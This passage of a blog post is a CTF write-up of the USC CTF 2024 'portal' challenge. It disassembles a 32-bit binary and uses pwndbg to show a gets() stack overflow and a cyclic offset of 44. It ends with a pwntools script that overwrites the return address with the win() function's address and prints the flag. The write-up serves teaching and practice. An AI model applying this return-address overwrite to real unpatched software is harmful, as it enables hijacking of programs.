</span></span><span style="display:flex;"><span> 8049278:       <span style="color:#ae81ff">83</span> c4 <span style="color:#ae81ff">10</span>                add    $0x10,%esp
</span></span><span style="display:flex;"><span> 804927b:       <span style="color:#ae81ff">90</span>                      nop
</span></span><span style="display:flex;"><span> 804927c:       8b 5d fc                mov    -0x4<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>,%ebx
</span></span><span style="display:flex;"><span> 804927f:       c9                      leave
</span></span><span style="display:flex;"><span> 8049280:       c3                      ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08049281</span> &lt;vuln&gt;:
</span></span><span style="display:flex;"><span> 8049281:       <span style="color:#ae81ff">55</span>                      push   %ebp
</span></span><span style="display:flex;"><span> 8049282:       <span style="color:#ae81ff">89</span> e5                   mov    %esp,%ebp
</span></span><span style="display:flex;"><span> 8049284:       <span style="color:#ae81ff">53</span>                      push   %ebx
</span></span><span style="display:flex;"><span> 8049285:       <span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">24</span>                sub    $0x24,%esp
</span></span><span style="display:flex;"><span> 8049288:       e8 a3 fe ff ff          call   <span style="color:#ae81ff">8049130</span> &lt;__x86.get_pc_thunk.bx&gt;
</span></span><span style="display:flex;"><span> 804928d:       <span style="color:#ae81ff">81</span> c3 <span style="color:#ae81ff">87</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>       add    $0x2087,%ebx
</span></span><span style="display:flex;"><span> 8049293:       <span style="color:#ae81ff">83</span> ec 0c                sub    $0xc,%esp
</span></span><span style="display:flex;"><span> 8049296:       8d <span style="color:#ae81ff">45</span> d8                lea    -0x28<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>,%eax
</span></span><span style="display:flex;"><span> 8049299:       <span style="color:#ae81ff">50</span>                      push   %eax
</span></span><span style="display:flex;"><span> 804929a:       e8 c1 fd ff ff          call   <span style="color:#ae81ff">8049060</span> &lt;gets@plt&gt;
</span></span><span style="display:flex;"><span> 804929f:       <span style="color:#ae81ff">83</span> c4 <span style="color:#ae81ff">10</span>                add    $0x10,%esp
</span></span><span style="display:flex;"><span> 80492a2:       e8 4f ff ff ff          call   80491f6 &lt;get_return_address&gt;
</span></span><span style="display:flex;"><span> 80492a7:       <span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">08</span>                sub    $0x8,%esp
</span></span><span style="display:flex;"><span> 80492aa:       <span style="color:#ae81ff">50</span>                      push   %eax
</span></span><span style="display:flex;"><span> 80492ab:       8d <span style="color:#ae81ff">83</span> 4c ed ff ff       lea    -0x12b4<span style="color:#f92672">(</span>%ebx<span style="color:#f92672">)</span>,%eax
</span></span><span style="display:flex;"><span> 80492b1:       <span style="color:#ae81ff">50</span>                      push   %eax
</span></span><span style="display:flex;"><span> 80492b2:       e8 <span style="color:#ae81ff">99</span> fd ff ff          call   <span style="color:#ae81ff">8049050</span> &lt;printf@plt&gt;
</span></span><span style="display:flex;"><span> 80492b7:       <span style="color:#ae81ff">83</span> c4 <span style="color:#ae81ff">10</span>                add    $0x10,%esp
</span></span><span style="display:flex;"><span> 80492ba:       <span style="color:#ae81ff">90</span>                      nop
</span></span><span style="display:flex;"><span> 80492bb:       8b 5d fc                mov    -0x4<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>,%ebx
</span></span><span style="display:flex;"><span> 80492be:       c9                      leave
</span></span><span style="display:flex;"><span> 80492bf:       c3                      ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>080492c0 &lt;main&gt;:
</span></span><span style="display:flex;"><span> 80492c0:       8d 4c <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">04</span>             lea    0x4<span style="color:#f92672">(</span>%esp<span style="color:#f92672">)</span>,%ecx
</span></span><span style="display:flex;"><span> 80492c4:       <span style="color:#ae81ff">83</span> e4 f0                and    $0xfffffff0,%esp
</span></span><span style="display:flex;"><span> 80492c7:       ff <span style="color:#ae81ff">71</span> fc                push   -0x4<span style="color:#f92672">(</span>%ecx<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> 80492ca:       <span style="color:#ae81ff">55</span>                      push   %ebp
</span></span><span style="display:flex;"><span> 80492cb:       <span style="color:#ae81ff">89</span> e5                   mov    %esp,%ebp
</span></span><span style="display:flex;"><span> 80492cd:       <span style="color:#ae81ff">53</span>                      push   %ebx
</span></span><span style="display:flex;"><span> 80492ce:       <span style="color:#ae81ff">51</span>                      push   %ecx
</span></span><span style="display:flex;"><span> 80492cf:       <span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">10</span>                sub    $0x10,%esp
</span></span><span style="display:flex;"><span> 80492d2:       e8 <span style="color:#ae81ff">59</span> fe ff ff          call   <span style="color:#ae81ff">8049130</span> &lt;__x86.get_pc_thunk.bx&gt;
</span></span><span style="display:flex;"><span> 80492d7:       <span style="color:#ae81ff">81</span> c3 3d <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>       add    $0x203d,%ebx
</span></span><span style="display:flex;"><span> 80492dd:       8b <span style="color:#ae81ff">83</span> fc ff ff ff       mov    -0x4<span style="color:#f92672">(</span>%ebx<span style="color:#f92672">)</span>,%eax
</span></span><span style="display:flex;"><span> 80492e3:       8b <span style="color:#ae81ff">00</span>                   mov    <span style="color:#f92672">(</span>%eax<span style="color:#f92672">)</span>,%eax
</span></span><span style="display:flex;"><span> 80492e5:       6a <span style="color:#ae81ff">00</span>                   push   $0x0
</span></span><span style="display:flex;"><span> 80492e7:       6a <span style="color:#ae81ff">02</span>                   push   $0x2
</span></span><span style="display:flex;"><span> 80492e9:       6a <span style="color:#ae81ff">00</span>                   push   $0x0
</span></span><span style="display:flex;"><span> 80492eb:       <span style="color:#ae81ff">50</span>                      push   %eax
</span></span><span style="display:flex;"><span> 80492ec:       e8 bf fd ff ff          call   80490b0 &lt;setvbuf@plt&gt;
</span></span><span style="display:flex;"><span> 80492f1:       <span style="color:#ae81ff">83</span> c4 <span style="color:#ae81ff">10</span>                add    $0x10,%esp
</span></span><span style="display:flex;"><span> 80492f4:       e8 <span style="color:#ae81ff">87</span> fd ff ff          call   <span style="color:#ae81ff">8049080</span> &lt;getegid@plt&gt;
</span></span><span style="display:flex;"><span> 80492f9:       <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">45</span> f4                mov    %eax,-0xc<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> 80492fc:       <span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">04</span>                sub    $0x4,%esp
</span></span><span style="display:flex;"><span> 80492ff:       ff <span style="color:#ae81ff">75</span> f4                push   -0xc<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> 8049302:       ff <span style="color:#ae81ff">75</span> f4                push   -0xc<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> 8049305:       ff <span style="color:#ae81ff">75</span> f4                push   -0xc<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> 8049308:       e8 c3 fd ff ff          call   80490d0 &lt;setresgid@plt&gt;
</span></span><span style="display:flex;"><span> 804930d:       <span style="color:#ae81ff">83</span> c4 <span style="color:#ae81ff">10</span>                add    $0x10,%esp
</span></span><span style="display:flex;"><span> 8049310:       <span style="color:#ae81ff">83</span> ec 0c                sub    $0xc,%esp
</span></span><span style="display:flex;"><span> 8049313:       8d <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">88</span> ed ff ff       lea    -0x1278<span style="color:#f92672">(</span>%ebx<span style="color:#f92672">)</span>,%eax
</span></span><span style="display:flex;"><span> 8049319:       <span style="color:#ae81ff">50</span>                      push   %eax
</span></span><span style="display:flex;"><span> 804931a:       e8 <span style="color:#ae81ff">71</span> fd ff ff          call   <span style="color:#ae81ff">8049090</span> &lt;puts@plt&gt;
</span></span><span style="display:flex;"><span> 804931f:       <span style="color:#ae81ff">83</span> c4 <span style="color:#ae81ff">10</span>                add    $0x10,%esp
</span></span><span style="display:flex;"><span> 8049322:       e8 5a ff ff ff          call   <span style="color:#ae81ff">8049281</span> &lt;vuln&gt;
</span></span><span style="display:flex;"><span> 8049327:       b8 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    $0x0,%eax
</span></span><span style="display:flex;"><span> 804932c:       8d <span style="color:#ae81ff">65</span> f8                lea    -0x8<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>,%esp
</span></span><span style="display:flex;"><span> 804932f:       <span style="color:#ae81ff">59</span>                      pop    %ecx
</span></span><span style="display:flex;"><span> 8049330:       5b                      pop    %ebx
</span></span><span style="display:flex;"><span> 8049331:       5d                      pop    %ebp
</span></span><span style="display:flex;"><span> 8049332:       8d <span style="color:#ae81ff">61</span> fc                lea    -0x4<span style="color:#f92672">(</span>%ecx<span style="color:#f92672">)</span>,%esp
</span></span><span style="display:flex;"><span> 8049335:       c3                      ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>The win function executes some operations, such as printing a flag. To exploit this, the program flow must be redirected to the win function.</p>
<h2 id="analyzing-the-program">Analyzing the Program<a hidden class="anchor" aria-hidden="true" href="#analyzing-the-program">#</a></h2>
<p>Running the binary prompts for input:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Please enter your string: 
</span></span><span style="display:flex;"><span>ABC
</span></span><span style="display:flex;"><span>Okay, time to <span style="color:#66d9ef">return</span>... Fingers Crossed... Jumping to 0x80492a7
</span></span></code></pre></div><p>The program takes your input and overwrites the return address on the stack. By analyzing its behavior in gdb, you can determine how to craft the payload. Sending a long input, such as 100 As, crashes the program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>*ESP  0xffffcedc ◂— <span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>
</span></span><span style="display:flex;"><span>*EIP  0x80492bf <span style="color:#f92672">(</span>vuln+62<span style="color:#f92672">)</span> ◂— ret 
</span></span><span style="display:flex;"><span>───────────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>───────────────────────────────────
</span></span><span style="display:flex;"><span>   0x80492b2 &lt;vuln+49&gt;    call   printf@plt                  &lt;printf@plt&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>   0x80492b7 &lt;vuln+54&gt;    add    esp, 0x10                    ESP <span style="color:#f92672">=</span>&gt; 0xffffceb0 <span style="color:#f92672">(</span>0xffffcea0 + 0x10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   0x80492ba &lt;vuln+57&gt;    nop    
</span></span><span style="display:flex;"><span>   0x80492bb &lt;vuln+58&gt;    mov    ebx, dword ptr <span style="color:#f92672">[</span>ebp - 4<span style="color:#f92672">]</span>     EBX, <span style="color:#f92672">[</span>0xffffced4<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; 0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   0x80492be &lt;vuln+61&gt;    leave  
</span></span><span style="display:flex;"><span> ► 0x80492bf &lt;vuln+62&gt;    ret                                &lt;0x41414141&gt;
</span></span><span style="display:flex;"><span>    ↓
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>───────────────────────────────────────────────<span style="color:#f92672">[</span> STACK <span style="color:#f92672">]</span>────────────────────────────────────────────────
</span></span><span style="display:flex;"><span>00:0000│ esp 0xffffcedc ◂— <span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>
</span></span><span style="display:flex;"><span>... ↓        <span style="color:#ae81ff">7</span> skipped
</span></span><span style="display:flex;"><span>─────────────────────────────────────────────<span style="color:#f92672">[</span> BACKTRACE <span style="color:#f92672">]</span>──────────────────────────────────────────────
</span></span><span style="display:flex;"><span> ► <span style="color:#ae81ff">0</span> 0x80492bf vuln+62
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span> 0x41414141 None
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span> 0x41414141 None
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span> 0x41414141 None
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span> 0x41414141 None
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span> 0x41414141 None
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span> 0x41414141 None
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span> 0x41414141 None
</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span style="display:flex;"><span>pwndbg&gt; ni
</span></span><span style="display:flex;"><span>0x41414141 in ?? <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
</span></span><span style="display:flex;"><span>─────────────────────────<span style="color:#f92672">[</span> REGISTERS / show-flags off / show-compact-regs off <span style="color:#f92672">]</span>─────────────────────────
</span></span><span style="display:flex;"><span> EAX  0x40
</span></span><span style="display:flex;"><span> EBX  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> ECX  <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> EDX  <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> EDI  0xf7ffcb60 <span style="color:#f92672">(</span>_rtld_global_ro<span style="color:#f92672">)</span> ◂— <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> ESI  0xffffcfcc —▸ 0xffffd1d8 ◂— <span style="color:#e6db74">&#39;COLORFGBG=15;0&#39;</span>
</span></span><span style="display:flex;"><span> EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>*ESP  0xffffcee0 ◂— <span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>
</span></span><span style="display:flex;"><span>*EIP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>───────────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>───────────────────────────────────
</span></span><span style="display:flex;"><span>Invalid address 0x41414141
</span></span></code></pre></div><p>At this point, you control the EIP register. When a function returns, the ret instruction pops the top value of the stack into EIP, redirecting execution to that address.</p>
<h2 id="finding-the-offset">Finding the Offset<a hidden class="anchor" aria-hidden="true" href="#finding-the-offset">#</a></h2>
<p>To determine the exact offset where the buffer overflow occurs, use a cyclic pattern:</p>
<pre tabindex="0"><code>───────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────
 ► 0x80491f9 &lt;get_return_address+3&gt;     call   __x86.get_pc_thunk.ax       &lt;__x86.get_pc_thunk.ax&gt;
        arg[0]: 0xffffced8 ◂— &#39;kaaalaaama&#39;
        arg[1]: 0x80492a7 (vuln+38) ◂— sub esp, 8
        arg[2]: 0x61616161 (&#39;aaaa&#39;)
        arg[3]: 0x61616162 (&#39;baaa&#39;)
 
   0x80491fe &lt;get_return_address+8&gt;     add    eax, 0x2116
   0x8049203 &lt;get_return_address+13&gt;    mov    eax, dword ptr [ebp + 4]
   0x8049206 &lt;get_return_address+16&gt;    pop    ebp
   0x8049207 &lt;get_return_address+17&gt;    ret    
 
   0x8049208 &lt;win&gt;                      push   ebp
   0x8049209 &lt;win+1&gt;                    mov    ebp, esp
   0x804920b &lt;win+3&gt;                    push   ebx
   0x804920c &lt;win+4&gt;                    sub    esp, 0x44
   0x804920f &lt;win+7&gt;                    call   __x86.get_pc_thunk.bx       &lt;__x86.get_pc_thunk.bx&gt;
 
   0x8049214 &lt;win+12&gt;                   add    ebx, 0x2100
───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ ebp esp 0xffffcea8 —▸ 0xffffced8 ◂— &#39;kaaalaaama&#39;
01:0004│+004     0xffffceac —▸ 0x80492a7 (vuln+38) ◂— sub esp, 8
02:0008│ eax     0xffffceb0 ◂— &#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama&#39;
03:000c│+00c     0xffffceb4 ◂— &#39;baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama&#39;
04:0010│+010     0xffffceb8 ◂— &#39;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama&#39;
05:0014│+014     0xffffcebc ◂— &#39;daaaeaaafaaagaaahaaaiaaajaaakaaalaaama&#39;
06:0018│+018     0xffffcec0 ◂— &#39;eaaafaaagaaahaaaiaaajaaakaaalaaama&#39;
07:001c│+01c     0xffffcec4 ◂— &#39;faaagaaahaaaiaaajaaakaaalaaama&#39;
─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► 0 0x80491f9 get_return_address+3
   1 0x80492a7 vuln+38
   2 0x6161616c None
   3 0xff00616d None
   4 0xf7d87964 None
────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; c
Continuing.
Okay, time to return... Fingers Crossed... Jumping to 0x80492a7

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────
*EAX  0x40
*EBX  0x6161616a (&#39;jaaa&#39;)
*ECX  0
 EDX  0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0xffffcfcc —▸ 0xffffd1d8 ◂— &#39;COLORFGBG=15;0&#39;
*EBP  0x6161616b (&#39;kaaa&#39;)
*ESP  0xffffcee0 ◂— 0xff00616d /* &#39;ma&#39; */
*EIP  0x6161616c (&#39;laaa&#39;)
───────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────
Invalid address 0x6161616c
</code></pre><p>As you can see, it tells you that <code>-x6161616c</code> was used to jump to that location which isn&rsquo;t available obviously.</p>
<pre tabindex="0"><code>pwndbg&gt; cyclic -l 0x6161616c
Finding cyclic pattern of 4 bytes: b&#39;laaa&#39; (hex: 0x6c616161)
Found at offset 44
</code></pre><p>This tells us that the buffer can hold 44 junk bytes before overwriting EIP. The final payload consists of:</p>
<ul>
<li>44 bytes of junk</li>
<li>The address of the win function (0x08049208).</li>
</ul>
<h2 id="crafting-the-exploit">Crafting the Exploit<a hidden class="anchor" aria-hidden="true" href="#crafting-the-exploit">#</a></h2>
<p>Using <code>pwntools</code>, you can automate the exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;i386&#39;</span>, os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#34;./portal&#34;)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;0.cloud.chals.io&#39;</span>, <span style="color:#ae81ff">11723</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span> 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x08049208</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="results">Results<a hidden class="anchor" aria-hidden="true" href="#results">#</a></h2>
<p>Running the script produces:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─$ python solve.py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 0.cloud.chals.io on port 11723: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>Please enter your string: 
</span></span><span style="display:flex;"><span>Okay, time to <span style="color:#66d9ef">return</span>... Fingers Crossed... Jumping to 0x80492a7
</span></span><span style="display:flex;"><span>CYBORG<span style="color:#f92672">{</span>w0w_u_r_0n_y0ur_w4y_2_b_a_r34l_h4x0r!<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span></code></pre></div><h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>Although 32-bit executables are less common today due to the widespread adoption of 64-bit systems, they are still found in legacy applications, embedded systems, and challenges like this. Understanding how to exploit 32-bit binaries remains a valuable skill for learning system internals and practicing reverse engineering.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://joonkim0625.github.io/tags/pwn/">Pwn</a></li>
      <li><a href="https://joonkim0625.github.io/tags/gdb/">Gdb</a></li>
      <li><a href="https://joonkim0625.github.io/tags/cybersecurity/">Cybersecurity</a></li>
      <li><a href="https://joonkim0625.github.io/tags/ctf/">CTF</a></li>
      <li><a href="https://joonkim0625.github.io/tags/uscctf-2024/">Uscctf 2024</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
